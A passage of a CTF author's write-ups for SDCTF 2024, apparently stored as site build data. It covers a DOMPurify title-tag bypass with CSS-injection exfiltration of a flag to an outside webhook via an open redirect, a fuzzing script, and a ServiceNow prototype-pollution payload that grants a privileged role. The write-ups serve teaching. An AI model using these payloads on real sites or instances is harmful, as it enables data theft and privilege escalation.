looks by simply setting your own flag cookie and seeing how the server renders the dialog, or noticing it in the `index.ejs` file:\n\n```html\n\u003Cp>\n  Oh? You seem to have a flag! You can view it\n  \u003Ca href=\"view?content=\u003C%- flag %>\">here\u003C/a>!\n\u003C/p>\n```\n\nWith this, note that XSS is not necessary to solve this challenge, but a leak via CSS Injection is sufficient.\n\nWhich brings us to the main part of the challenge, how do you get CSS Injection? The main idea here is that the browser parses the `\u003Ctitle>` a bit differently. Try this in a browser console:\n\n```js\ndocument.write(\"\u003Chead>\u003Ctitle>\u003Ctitle>\u003C/title>\u003C/head>\");\n```\n\nNotice if you inspect the HTML in the browser, the inner `title` tag is actually automatically escaped.\n\n```html\n\u003Ctitle>&lt;title&gt;\u003C/title>\n```\n\nThe DOMPurify context of the `sharedby` variable is different than the actual browser, and the DOMPurify sanitization context is not expected to be in this context.\n\nIt should be known that one thing that DOMPurify also does is Prevent Structural Damage:\n\n> The HTML string or document returned by DOMPurify is sane HTML and doesn't miss closing tags or other bits that might ruin your website's structure or even leak data. If you find a way to do that anyway, it's a bug and we will fix it. Please let us know. ([source](https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model))\n\nWhat this means is that even though we can't use `/` in our `sharedby` variable, maybe we can somehow get DOMPurify to \"fix\" structural damage in such a way that it generates the `\u003C/title>` tag for us followed by a `style` tag? Well we can try this out.\n\n### Fuzzing\n\nYou can do this by fuzzing locally. Here is a script that I used:\n\n```js\nconst ejs = require('ejs');\nconst fs = require('fs');\nconst createDOMPurify = require(\"dompurify\");\nconst { JSDOM } = require(\"jsdom\");\n\nconst window = new JSDOM(\"\").window;\nconst DOMPurify = createDOMPurify(window);\n\nconst template = `\n\u003Chead>\n    \u003Cmeta charset=\"UTF-8\">\n    \u003Cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    \u003Ctitle>\n        Fancy Text Viewer\n        \u003C% if (sharedby) { %>\n            | Shared by \u003C%- sharedby %>\n        \u003C% } %>\n    \u003C/title>\n    \u003C!DOCTYPE html>\n    \u003Chtml>\n\n    \u003Chead>\n        \u003Clink rel=\"stylesheet\" href=\"/static/style.css\">\n    \u003C/head>\n\u003C/head>\n\u003Cbody>\n    \u003Cdiv class=\"container\">\n    \u003C/div>\n\u003C/body>\n`;\n\n\n// FROM https://github.com/cure53/DOMPurify/blob/main/src/tags.js\nconst html = [ 'a', 'abbr', ...];\nconst svg = [  'svg', 'a', ...];\n\nfunction random_choice(list) {\n  let index = Math.floor(Math.random() * list.length);\n  return list[index];\n}\n\nfunction getIndicesOf(searchStr, str, caseSensitive) {\n  var searchStrLen = searchStr.length;\n  if (searchStrLen == 0) {\n      return [];\n  }\n  var startIndex = 0, index, indices = [];\n  if (!caseSensitive) {\n      str = str.toLowerCase();\n      searchStr = searchStr.toLowerCase();\n  }\n  while ((index = str.indexOf(searchStr, startIndex)) > -1) {\n      indices.push(index);\n      startIndex = index + searchStrLen;\n  }\n  return indices;\n}\n\nlet wl = html.concat(svg);\n\nfunction get_injection_string(p) {\n    return `\u003C${random_choice(wl)}>INJECT`\n}\n\nlet p_len = 8;\nfor ( ; ; ) {\n  let payload = []\n  for (let i = 0; i \u003C p_len; i++) {\n    payload.push(get_injection_string(i));\n  }\n  let payload_main = payload.join('');\n\n  const data = {\n    sharedby: DOMPurify.sanitize(payload_main),\n  };\n\n  window.document.getElementsByTagName('html')[0].innerHTML = ejs.render(template, data);\n  var resp = window.document.getElementsByTagName('html')[0].innerHTML;\n\n\n  // Try to see if we were able to escape the title tag. Since DOMPurify allows styles by default, this can give us a lead into injecting CSS.\n  var indices = getIndicesOf(\"INJECT\", resp);\n  if (indices.some((e) => e > resp.indexOf('\u003C/title>'))) {\n    console.log(\"Payload: \", payload_main);\n    console.log(\"Sanitized: \", data.sharedby);\n    console.log(resp)\n  }\n}\n```\n\nReally quickly, we will start to get results of tags that find INJECT string outside the `\u003C/title>` in the actual dom. (And if you try any of these as the `sharedby` param on the actual site, you will also see this behavior).\n\n```html\nPayload:\n\u003Ctable>\n  INJECT\u003Ctitle>\n    INJECT\u003Cfilter>INJECT\u003Cprogress>INJECT\u003Ctextarea>INJECT\u003Col>INJECT\u003Cmarquee>INJECT\u003Ccolgroup>INJECT\n    Sanitized:\n    \u003Ctitle>INJECT&lt;filter&gt;INJECT&lt;progress&gt;INJECT&lt;textarea&gt;INJECT&lt;ol&gt;INJECT&lt;marquee&gt;INJECT&lt;colgroup&gt;INJECT\n  \u003C/title>\n  \u003Ctable>\u003C/table>\n  INJECT\n  \u003Chead>\n    \u003Cmeta charset=\"UTF-8\" />\n    \u003Cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    \u003Ctitle>\n      Fancy Text Viewer | Shared by\n      &lt;title&gt;INJECT&lt;filter&gt;INJECT&lt;progress&gt;INJECT&lt;textarea&gt;INJECT&lt;ol&gt;INJECT&lt;marquee&gt;INJECT&lt;colgroup&gt;INJECT\n    \u003C/title>\n  \u003C/head>\n  \u003Cbody>\n    \u003Ctable>\u003C/table>\n    INJECT\n    \u003Clink rel=\"stylesheet\" href=\"/static/style.css\" />\n    \u003Cdiv class=\"container\">\u003C/div>\n  \u003C/body>\n\u003C/table>\n```\n\nYou can note here that the main issue that causes this behavior seems to be the `\u003Ctable>` tag. You can continue to modify this fuzz script to specify some explicit tags like table, style, and fuzz the rest.\n\nEventually, the payload I found that was:\n\n```html\n\u003CTABLE>\u003CTH>\u003CSVG>\u003CSTYLE>INJECT\u003CTITLE>\u003CCOL>\u003CTITLE>\n```\n\nWhen this gets passed through DOMPurify, it becomes:\n\n```html\n\u003Ctitle>\u003C/title>\n\u003Ctable>\n  \u003Ctbody>\n    \u003Ctr>\n      \u003Cth>\n        \u003Csvg>\n          \u003Cstyle>\n            INJECT\u003Ctitle>\u003C/title>\n          \u003C/style>\n        \u003C/svg>\n      \u003C/th>\n    \u003C/tr>\n  \u003C/tbody>\n  \u003Ccolgroup>\n    \u003Ccol />\n  \u003C/colgroup>\n\u003C/table>\n```\n\nAnd when its in a title context, note that the first closing title tag is before the `\u003Cstyle>INJECT`, meaning the style will be outside the title tag and will apply to the overall document.\n\n### Exfiltration\n\nBut still, now how do we exfiltrate? For this, we can look back to the `app.js` and notice a few convenient gadgets. These two inclusions are expecially interesting:\n\n```js\napp.use((req, res, next) => {\n  for (const key in req.query) {\n    let value = req.query[key];\n    delete req.query[key];\n    req.query[key.toLowerCase()] = value;\n  }\n  next();\n});\n\napp.get(\"/redirect\", (req, res) => {\n  let url = req.query.url;\n  if (!url.startsWith(\"http://\") && !url.startsWith(\"https://\")) {\n    url = \"http://\" + url;\n  }\n  res.redirect(url);\n});\n```\n\nThe first seems to normalize all keys and make them lowercase. This seems like it could definately be useful, since our character set only allows uppercase characters.\n\nThe second is a redirect route, which will redirect to any url we give it. Note though that this redirect endpoint will actually add `http://` to our url if it doesn't already start with that. This might be interesting as well since we dont have a `/`, but can use this so get a URL.\n\nHopefully these are hinting to the solution now, and we can put it all together. We don't have that many characters to work with in our stylesheet, so we atleast need to import another one. Here is the final payload I used:\n\n```html\n\u003CTABLE>\u003CTH>\u003CSVG>\u003CSTYLE>@IMPORT URL(REDIRECT?URL=EO5VZGJXDJI72UU.M.PIPEDREAM.NET)\u003CTITLE>\u003CCOL>\u003CTITLE>\n```\n\nThis will import the stylesheet at `EO5VZGJXDJI72UU.M.PIPEDREAM.NET`, a free webhook service.\nThis stylesheet can follow a standard CSS Leak pattern: We utilize a CSS selector on the `a` tags' `href` attribute. If we have a match, we set the background to our webhook, with a parameter that identifies what letter triggered it. We can leak the flag one (or multiple) characters at a time using this procedure.\n\n```css\na[href^=\"view\\?content\\=sdctf{a\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{a);\n}\na[href^=\"view\\?content\\=sdctf{b\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{b);\n}\na[href^=\"view\\?content\\=sdctf{c\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{c);\n}\na[href^=\"view\\?content\\=sdctf{d\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{d);\n}\na[href^=\"view\\?content\\=sdctf{e\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{e);\n}\na[href^=\"view\\?content\\=sdctf{f\"] {\n  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{f);\n}\n```\n\n### References\n\n- https://xsleaks.dev/docs/attacks/css-injection/\n- https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\n- https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/\n- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\n- https://mizu.re/post/intigriti-october-2023-xss-challenge\n\n## SNOWfall (1 solve, 500 pts)\n\n### Description\n\nFlag is at https://dev258962.service-now.com/flag, thats it! Oh you might need a special role for it, but I hear its not too hard to request.\n\n### Challenge\n\nWe are given a link to a ServiceNow instance, and are told that the flag is at the `/flag` endpoint. We are also told that we might need a special role for it, hinting that the `/flag` endpoint is protected by some sort of role based access control. We are additionally given a `zip` containing `SNOWfall.xml`, which is an \"Update Set\", similar to a `patch` file that can be applied to a personal ServiceNow instance to recreate the challenge scenario.\n\n### Notes\n\nThis challenge is definately a bit different than most web challenges people are used to, even though the core vulnurability is an extremely well known javascript vulnerability that many CTF players are likely familiar with. The challenge runs on a ServiceNow instance, which is a cloud based platform that provides a variety of services, and is also used by UC San Diego themselves for internal document and case management. Since the challenge is a bit different, I will provide a brief overview of the ServiceNow platform, and how the challenge is setup, which hopefully gives a good perspective into what went into this challenge.\n\nAt its core, ServiceNow breaks everything down into tables. Everything in ServiceNow is a record in some table, whether it be a user in the `sys_user` table, a catalog item in the `sc_cat_item` table, or an ACL policy in the `sys_security_acl_list`. If we look at the Customer Updates in the `SNOWFall.xml` file, we can see these more clearly:\n\n![](snow-updates.png)\n\nWe can see the \"Type\" (table) as well as the Record Name for the update. What this update set added overall was the `/flag` page, one Catalog Item called `Flag Holder Application`, and an associated Workflow. From a better UI, the flag holder application looks like this:\n![](snow-catitem.png)\n\nWe can also see the associated variables for this catalog item on the bottom when we scroll down:\n![](snow-variables.png)\n\nOne thing to see here is that there is a `meta` variable thats hidden. This data is populated by an `onSubmit` Catalog Client Script, which is a script that runs when the form is submitted. This script is as follows:\n\n```js\nfunction onSubmit() {\n  // Populate the \"meta\" variable with a JSON object containing the catalog item metadata\n  var meta = {};\n  var time = new Date();\n  var submitter = g_user.userID;\n  var submitterName = g_user.getFullName();\n\n  meta.time = time.toLocaleString();\n  meta.submitter = submitter;\n  meta.submitterName = submitterName;\n\n  g_form.setValue(\"meta\", JSON.stringify(meta));\n}\n```\n\nNote here, that this code is run on the server. However note that even though this a hidden field, it is still being submitted from the client, so we can modify it.\n\nNext to notice is the backend, which is the `Flag Holder Application Workflow`.\n![](snow-workflow.png)\n\nThere are two main issues here, First is in the \"Validate Form Answers\" If script:\n\n```js\nfunction ifScript() {\n  var now = new global.ServiceNowObjectUtils();\n  var form_data = {};\n\n  now.merge(form_data, JSON.parse(current.variables.meta));\n  now.merge(form_data, current.variables);\n\n  var ritm_data = {};\n  now.merge(ritm_data, current);\n\n  gs.info(JSON.stringify(form_data));\n  var issues = [];\n\n  // Validate form submission\n  if (form_data.submitter != current.opened_by.sys_id) {\n    issues.push(\"You don't seem to be the opener of this case.\");\n  }\n\n  if (form_data.do_you_want_to_be_a_flag_holder !== \"Yes\") {\n    issues.push(\"You must want to be a flag holder.\");\n  }\n\n  var HSLUtils = new global.HSLUtils();\n  var colors = form_data.question_color_palette_of_meal.split(\"|\");\n  if (colors.length !== 4) {\n    issues.push(\"You must select 4 colors.\");\n  }\n\n  for (var i = 0; i \u003C colors.length; i++) {\n    if (!HSLUtils.test(colors[i])) {\n      issues.push(\"Invalid color: \" + colors[i]);\n    }\n  }\n\n  if (form_data.question_favorite_ice_shape !== \"ic_klein_bottle\") {\n    issues.push(\"We only like 4D ice here.\");\n  }\n\n  if (form_data.question_describe_food_taste.length \u003C 30) {\n    issues.push(\"Please describe the taste of food in more detail.\");\n  }\n\n  if (issues.length > 0) {\n    workflow.scratchpad.issue_message = \"\\n\" + issues.join(\"\\n\");\n    workflow.scratchpad.issue_count = issues.length;\n    return false;\n  }\n\n  return true;\n}\n\nanswer = ifScript() ? \"yes\" : \"no\";\n```\n\nAt the top of the script, we call:\n\n```js\nvar now = new global.ServiceNowObjectUtils();\nvar form_data = {};\n\nnow.merge(form_data, JSON.parse(current.variables.meta));\nnow.merge(form_data, current.variables);\n```\n\nThis creates a `ServiceNowObjectUtils` object, which is also present in the Update Set. This is known as a Script Include, which is a reusable script that can be called from other scripts. The `ServiceNowObjectUtils` script include is as follows:\n\n```js\nvar ServiceNowObjectUtils = Class.create();\nServiceNowObjectUtils.prototype = {\n  initialize: function () {},\n\n  merge: function (base, obj) {\n    function isObject(obj) {\n      return (\n        (typeof obj === \"object\" || typeof obj === \"function\") &&\n        !String(obj.constructor.name).startsWith(\"Glide\")\n      );\n    }\n\n    for (var key in obj) {\n      if (isObject(base[key]) && isObject(obj[key])) {\n        this.merge(base[key], obj[key]);\n      } else if (key in base) {\n        continue;\n      } else {\n        if (\n          obj[key].constructor &&\n          obj[key].constructor.name.startsWith(\"Glide\")\n        ) {\n          // To normalize special Glide Objects that can't be traversed\n          base[key] = obj[key].toString();\n        } else {\n          base[key] = obj[key];\n        }\n      }\n    }\n    return base;\n  },\n  type: \"ServiceNowObjectUtils\",\n};\n```\n\nTaking a look at this, one should note that this is a classic case of an unsafe recursive object merge. This is a common vulnerability in javascript, and is known as Prototype Pollution. The `merge` function is recursive, and will merge objects together. However, if the object being merged has a prototype property, it will be copied over to the base object. This can be used to overwrite properties on the base object, and can be used to overwrite properties on the base `{}` object.\n\nThe next issue is in the actual `Administrator` script:\n\n```js\nvar GlideRecordUtil = new global.GlideRecordUtil();\nvar RoleModUtils = new global.RoleModUtils();\n\nvar gr = new GlideRecord(\"sys_user_has_role\");\ngr.addQuery(\"role\", \"2831a114c611228501d4ea6c309d626d\"); // admin\ngr.query();\n\ndo {\n  var user_role_obj = {};\n  GlideRecordUtil.populateFromGR(user_role_obj, gr);\n  if (user_role_obj.user == current.opened_by) {\n    RoleModUtils.addRole(current.opened_by, \"c60206c2c30602102a53fdec05013190\");\n    workflow.scratchpad.admin_message = \"lgtm, added flag_holder role\";\n    return true;\n  }\n} while (gr.next());\n```\n\nIts a very subtle issue, but if we look at the `GlideRecord` documentation, we need to actually call `gr.next()` first to get the first record queried. The subtle issue here is that in the first loop iteration, we are going to be referencing an empty object. We can use this to our advantage, combined with the prototype pollution vulnerability.\n\nThe solution here is to pass the following from the client as the \"meta\" variable.\n\n```json\n{\n  \"time\": \"5/15/2024, 1:54:18 AM\",\n  \"submitter\": \"--sys-id--\",\n  \"submitterName\": \"System Administrator\",\n  \"constructor\": {\n    \"prototype\": {\n      \"user\": \"--sys-id--\"\n    }\n  }\n}\n```\n\n### Notes\n\nThis challenge ended up being much harder than expected, with only 1 solve. This was my mistake, I should have definately provided more information about the ServiceNow platform from the start as well are various references as to how to access records in the platform.\n\nThe one team who solved it, `000`, seemed to solve it in this general pattern as well, by starting off noticing the unsafe merge merge code in `ServiceNowObjectUtils`, and then noticing that the `populateFromGR` record was returning an empty object for the record. Its definately extremely extremely hard to solve this without setting up your own PDI, so I should have provided more information on how to do this as well.\n\nBut overall this was extremely impressive by `000`, and I had seen a few other challengers get extremely close as well.\n\nAnother thing that did trip some users who got this far up, is that the ServiceNow server is running on Rhino1.7R5. People who tried to do prototype pollution using `__proto__` had quit early when it didn't work, but this was due to this Javascript runtime not supporting `__proto__`. There were people who were soooooo close, but got stuck here. I hope people learned alot though about this platform, and it was hopefully a good (maybe just interesting) change of pace :).\n\n### References\n\n- https://developer.servicenow.com/dev.do#!/learn/learning-plans/utah/new_to_servicenow/app_store_learnv2_buildmyfirstapp_utah_personal_developer_instances\n- https://docs.servicenow.com/bundle/utah-it-service-management/page/product/site-reliability-ops/task/sro-update-set-quick-start.html\n- https://developer.servicenow.com/blog.do?p=/post/training-scriptsbg/\n\n## Conclusion\n\nThis was a fun CTF to organize, and I hope everyone enjoyed it. I know we had some issues in the beginning (ahem ahem rip infra), but I hope people enjoyed these challenges and thought they were unique / interesting. Thank you for playing and see you next time! :D","src/content/blog/SDCTF-2024-Author-Writeups/index.md",[150,115,151,152,153,154],"logo.png","snow-updates.png","snow-catitem.png","snow-variables.png","snow-workflow.png","508cfd87945778f2",{"html":157,"metadata":158},"\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;logo.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>This weekend, ACM Cyber at UC San Diego hosted \u003Cstrong>SDCTF 2024\u003C/strong>, an online CTF competition lasting 48 hours, where players around the world complete to solve challenges and capture flags in the categories: web, pwn, reverse engineering, cryptography, and misc. I was one of the authors for this CTF, and wrote 4 challenges in total. In this post, I will share notes on my explanations, ideas, and solutions for each of the challenges I wrote.\u003C/p>\n\u003Ch1 id=\"misc\">\u003Ca href=\"#misc\">Misc\u003C/a>\u003C/h1>\n\u003Ch2 id=\"blackjack-14-solves-162-pts\">\u003Ca href=\"#blackjack-14-solves-162-pts\">Blackjack (14 solves, 162 pts)\u003C/a>\u003C/h2>\n\u003Ch3 id=\"description\">\u003Ca href=\"#description\">Description\u003C/a>\u003C/h3>\n\u003Cp>GAMBA\u003C/p>\n\u003Ch3 id=\"challenge\">\u003Ca href=\"#challenge\">Challenge\u003C/a>\u003C/h3>\n\u003Cp>You are given an attachment \u003Ccode>blackjack.zip\u003C/code>. This file contains the necessary files to run a Docker container. Once running the entry, \u003Ccode>main.py\u003C/code> script, we are prompted with the following:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.zgx9u.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.p1z7b.js\">\u003C/script>\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"console\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[Dealer] Resetting shoe...\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">Player balance: 30000\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[BEGIN USER INTERACTION]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">Player, enter your bet:\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"[Dealer] Resetting shoe...Player balance: 30000[BEGIN USER INTERACTION]Player, enter your bet:\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We are given $30000 to start with and we can place bets to play blackjack. The \u003Ccode>main.py\u003C/code> file is as follows:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> os\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> game \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Game, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TABLE_MINIMUM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TABLE_MAXIMUM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TOO_MUCH_MONEY\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">FLAG\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> os.environ.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"FLAG\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"sdctf\u003C/span>\u003Cspan style=\"--0:#79B8FF\">{test_flag}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">game \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Game()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">game.start_game()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">True\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">game.play_round()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> game.player.balance \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TABLE_MINIMUM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"You don't have enough money to play another round. Goodbye.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">break\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> game.player.balance \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TOO_MUCH_MONEY\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"I'm sorry I'm going to have to back you off. You're too good for us.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Here is a flag for your troubles: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{FLAG}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">break\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import osfrom game import Game, TABLE_MINIMUM, TABLE_MAXIMUM, TOO_MUCH_MONEYFLAG = os.environ.get(&#x22;FLAG&#x22;, &#x22;sdctf{test_flag}&#x22;)game = Game()game.start_game()while True:    game.play_round()    if game.player.balance \u003C TABLE_MINIMUM:        print(&#x22;You don&#x27;t have enough money to play another round. Goodbye.&#x22;)        break    if game.player.balance > TOO_MUCH_MONEY:        print(&#x22;I&#x27;m sorry I&#x27;m going to have to back you off. You&#x27;re too good for us.&#x22;)        print(f&#x22;Here is a flag for your troubles: {FLAG}&#x22;)        break\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>From here we can see that if we can get our balance to exceed \u003Ccode>TOO_MUCH_MONEY\u003C/code>, we will be given the flag. The \u003Ccode>TOO_MUCH_MONEY\u003C/code> is defined in \u003Ccode>game.py\u003C/code> as \u003Ccode>150000\u003C/code>. The \u003Ccode>Game\u003C/code> class is defined in \u003Ccode>game.py\u003C/code> and contains the logic for the blackjack game.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">TABLE_MINIMUM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">TABLE_MAXIMUM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2000\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">TOO_MUCH_MONEY\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">150000\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"TABLE_MINIMUM = 50TABLE_MAXIMUM = 2000TOO_MUCH_MONEY = 150000\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch3 id=\"notes\">\u003Ca href=\"#notes\">Notes\u003C/a>\u003C/h3>\n\u003Cp>I hope people didn’t spend too much time trying to find a programming bug in the blackjack source code itself, since there was not intended to be one. The intended solution is a “vulnerability” in the game of Blackjack itself. While the game normally has a house edge, its possible to play in such a way that the player can start to even out those odds. This strategy is called “Basic Strategy” and is a set of rules that tells you the optimal best move to make in every situation. Its possible to go further using rules such as card counting and deviations, and this can start to give the player an edge over the house.\u003C/p>\n\u003Cp>When developing the challenge, I found with only basic strategy, a bit of time, and some luck, it was possible to still achieve the target balance, so this was sufficient. This was more of a PPC challenge and I hope people enjoyed it.\u003C/p>\n\u003Ch3 id=\"solve-script\">\u003Ca href=\"#solve-script\">Solve Script\u003C/a>\u003C/h3>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">H, S, D, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan 